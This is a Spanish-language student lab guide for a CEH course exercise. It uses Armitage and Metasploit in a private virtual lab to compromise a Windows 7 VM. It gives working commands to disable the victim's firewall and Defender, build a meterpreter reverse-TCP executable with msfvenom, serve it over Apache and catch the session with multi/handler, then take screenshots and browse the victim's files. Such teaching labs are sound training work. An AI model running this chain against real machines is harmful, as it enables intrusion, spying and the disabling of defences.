# 📋 Práctica 3: Armitage (CEH 1.5) – 5 puntos

## Preparación ANTES del video (desde snapshot, en este orden exacto)

> Si vienes de restaurar el snapshot, haz estos 5 pasos **en este orden** y ninguno de los errores que ya te salieron vuelve a aparecer: ni el pop-up de `database.yml`, ni el `SSL error`, ni sesiones que mueren.

### Paso 1 – Restaurar y verificar la red

1. Restaura el snapshot de antes de todo.
2. En Kali: `ip a` → tiene que seguir en `192.168.190.129` (si no, aplica el Paso 0 de la Práctica 1 con nmcli).
3. En Victima 2: `ipconfig` → `192.168.190.132`.
4. Ping cruzado en ambos sentidos para confirmar que se ven.

### Paso 2 – Inicializar la base de datos (evita el pop-up `database.yml`)

```bash
sudo service postgresql start
sudo msfdb init
```

**Explicación:** "`msfdb init` crea el archivo database.yml e inicializa la base de datos de Metasploit." Sin este paso, al abrir Armitage sale el pop-up `I can not find a database.yml file. I *really* need it`.

- Si dice que la base ya existe: `sudo msfdb reinit`.
- Verifica que exista: `ls -l /usr/share/metasploit-framework/config/database.yml`.
- ⚠️ El `sudo service mysql start` no hace falta: Metasploit usa PostgreSQL, no MySQL.

### Paso 3 – Arreglar la autenticación (evita `SSL error` / `Could not connect to database`)

```bash
sudo nano /etc/postgresql/15/main/pg_hba.conf
```

En `# IPv4 local connections:` cambia `scram-sha-256` por `trust`:

```
host    all    all    127.0.0.1/32    trust
```

⚠️ Es la línea de **`all`**, NO la de `replication` (la primera vez cambiaste la de replication y siguió fallando). Luego:

```bash
sudo nano /etc/postgresql/15/main/postgresql.conf
```

Cambia `ssl = on` por `ssl = off`. Guarda con Ctrl+O, Enter, Ctrl+X.

```bash
sudo service postgresql restart
```

Si no existe `postgresql/15`, mira la carpeta real con `ls /etc/postgresql`.

### Paso 4 – Limpiar procesos y preparar la carpeta compartida

```bash
sudo pkill -f msfrpcd
sudo pkill -f armitage
sudo mkdir -p /var/www/html/share
sudo chmod -R 755 /var/www/html/share
sudo chown -R www-data:www-data /var/www/html/share
sudo service apache2 start
```

### Paso 5 – Victima 2 (CMD como administrador)

```cmd
netsh advfirewall set allprofiles state off
sc stop WinDefend
sc config WinDefend start= disabled
```

Verifica que la IP siga siendo `192.168.190.132` (`ipconfig`). Esto evita la sesión que se abre y muere al instante (`Reason: Died`) por Defender o el firewall.

### Prueba final antes de grabar

```bash
sudo armitage
```

Si abre **sin pop-ups** y conecta con `127.0.0.1:55553`, msf/msf → ciérralo y ya puedes grabar limpio. (Al cerrarlo se limpian los procesos y no dará `Address already in use` durante la grabación.)

**Fallbacks si algo aún falla:**

- Java muy nuevo (17+ rompe Armitage): `sudo apt install openjdk-11-jdk -y` y `sudo update-alternatives --config java` → elegir Java 11.
- msfrpcd manual: en una terminal `sudo msfrpcd -P msf -S -a 127.0.0.1 -p 55553` (se queda "colgado", es normal, no la cierres) y en otra `armitage`. Connect: 127.0.0.1, 55553, msf/msf. Si pregunta "Start Metasploit?" → **No** (ya lo iniciaste manual).
- Aún sale el pop-up de database.yml: `export MSF_DATABASE_CONFIG=/usr/share/metasploit-framework/config/database.yml` y luego `sudo -E armitage` (el `-E` pasa la variable al root).
- `Address already in use`: `sudo pkill -f msfrpcd` y `sudo pkill -f armitage`, abre Armitage otra vez.

## En cámara

1. En Kali:

```bash
sudo service postgresql start
sudo armitage
```

Connect: Host `127.0.0.1`, puerto `55553`, usuario `msf`, clave `msf`. Si pregunta **Start Metasploit** → **Yes**. Espera a que cargue el mapa.

2. **Hosts → Nmap Scan → Intense Scan** → IP `192.168.190.132` → OK. Espera el icono de Windows (Scan Complete → OK).

**Explicación:** "Escaneo a la víctima para confirmar que está viva y que es Windows."

3. En el panel izquierdo: **payload → windows → meterpreter → meterpreter\_reverse\_tcp** (doble clic).
  - **LHOST:** `192.168.190.129`
  - **LPORT:** `4444` (⚠️ no 444: en tu Kali ya estaba ocupado — dilo en el video)
  - **Output:** `exe` → **Launch**.
  - En el diálogo **Guardar** de Armitage: navega hasta **`/var/www/html/share/`** y guarda el archivo ahí mismo, con el nombre **`malicious_payload.exe`** (como el PDF). ⚠️ Ahorra el paso de copiar: como el exe ya queda servido por Apache, la víctima lo ve directamente en `http://192.168.190.129/share`. *(Si el diálogo no aparece, es el error conocido: el exe se guardó solo en alguna carpeta de Armitage. En ese caso genera el exe manualmente con el comando del punto siguiente — mismo nombre, misma carpeta.)*

**Explicación:** "Genero el payload Meterpreter en formato exe y lo guardo directamente en la carpeta compartida de Apache."

4. Verifica que quedó bien y que Apache está arriba:

```bash
sudo service apache2 start
ls -l /var/www/html/share/
```

Tiene que listar `malicious_payload.exe`. Si el diálogo de Armitage no guardó nada, genera el exe manualmente (mismo nombre, misma carpeta):

```bash
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.190.129 LPORT=4444 EXITFUNC=thread -f exe > /var/www/html/share/malicious_payload.exe
```

⚠️ **Sobre el nombre:** da igual cómo se llame el archivo (en la sesión anterior uno se llamó `payload_final.exe` porque se generó a mano). Lo importante es que el exe que está en `/var/www/html/share/` sea el mismo que ejecuta la víctima y apunte al LPORT del handler. Para el video usa siempre `malicious_payload.exe` y no mezclas.

5. Vuelve a Armitage. Otra vez **meterpreter\_reverse\_tcp**, misma LHOST, LPORT `4444`, **Output: multi/handler** → **Launch**. Tiene que salir `Started reverse TCP handler on 192.168.190.129:4444`.
6. **Si la sesión se abre y se muere (`Reason: Died`)** — te pasó varias veces — en la consola de abajo de Armitage, ANTES de ejecutar el exe:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.190.129
set LPORT 4444
set ExitOnSession false
exploit -j
```

⚠️ `Unknown command: exploit` sale si escribes `exploit` sin el `use` de arriba. `ExitOnSession false` es lo que evita que la sesión muere.

7. En Victima 2, Firefox: `http://192.168.190.129/share`. Clic en `malicious_payload.exe` → **Save File** → Descargas → doble clic → **Run**.
  - Si no abre la página: Apache caído o la IP de Kali cambió.
8. El icono de la víctima se pone **rojo con rayos** = sesión abierta.
  - Clic derecho → **Meterpreter 1 → Interact → Meterpreter Shell** → escribe `sysinfo`. **Tarda, es normal.** Debe decir `Computer: VICTIMA2`, `OS: Windows 7`.
  - Clic derecho → **Meterpreter 1 → Explore → Browse Files** → se abre la pestaña **Files 1** (una tabla DENTRO de Armitage, no una ventana de Windows; tarda un poco).
  - Clic derecho → **Meterpreter 1 → Explore → Screenshot** → pestaña **Screenshot 1** con la pantalla de Victima 2 (el orden con Browse Files da igual).

**Explicación:** "Ya tengo control remoto: veo información del sistema, puedo explorar archivos y capturar la pantalla de la víctima."

9. Cierra todo. En cámara: escaneaste, generaste el payload, lo serviste por Apache y obtuviste Meterpreter.

⚠️ Al terminar: **cierra Armitage y mata msfrpcd** para liberar el 4444 antes de hacer el golpe final del Buffer Overflow.

---
